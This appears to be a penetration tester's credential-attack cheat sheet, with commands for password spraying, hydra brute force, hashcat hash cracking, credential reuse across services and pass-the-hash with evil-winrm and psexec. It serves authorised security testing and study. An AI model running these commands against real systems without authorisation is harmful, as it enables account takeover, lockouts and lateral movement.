# 📇 Credential Attacks Cheat Sheet

> Scan-only. Full detail in [[Credential Attacks]]. **Golden rule: every cred/hash/key → test on every service and host.**

## Spray / brute (mind lockout — check policy first)
```bash
netexec smb $IP -u users.txt -p 'Password1' --continue-on-success
```
```bash
hydra -L users.txt -P rockyou.txt ssh://$IP -t 4
```
```bash
hydra -L users.txt -P rockyou.txt $IP http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"
```

## Crack hashes (hashcat modes)
```bash
hashcat -m 0     hashes.txt rockyou.txt      # MD5
```
```bash
hashcat -m 100   hashes.txt rockyou.txt      # SHA1
```
```bash
hashcat -m 1000  hashes.txt rockyou.txt      # NTLM
```
```bash
hashcat -m 5600  hashes.txt rockyou.txt      # NetNTLMv2
```
```bash
hashcat -m 1800  hashes.txt rockyou.txt      # sha512crypt ($6$)
```
```bash
hashcat -m 18200 asrep.txt rockyou.txt       # AS-REP  | -m 13100 = Kerberoast
```
Identify unknown hash: `hashid <hash>` or `hash-identifier`.
Crack SSH key passphrase: `ssh2john id_rsa > h; john h`.

## Reuse matrix (test EVERY cred here)
| Have | Try on |
|---|---|
| Windows user/pass or NT hash | [[SMB]] · [[WinRM]] · [[RDP]] · [[MSSQL]] · [[LDAP]] |
| Linux/any password | [[SSH]] · web logins · DBs · sudo |
| SSH private key | [[SSH]] (other users/hosts) |
| DB creds | that DB · **SSH** (often reused) · web |
| Cracked service acct | its host + the reuse matrix |

## Pass-the-hash
```bash
evil-winrm -i $IP -u user -H <NThash>
```
```bash
impacket-psexec -hashes :<NThash> DOMAIN/user@$IP
```

## Rules
- **Check lockout policy** (rpcclient `getdompwinfo`) before spraying AD.
- Keep a running `creds.txt` / `users.txt`; rerun the matrix on every new find.
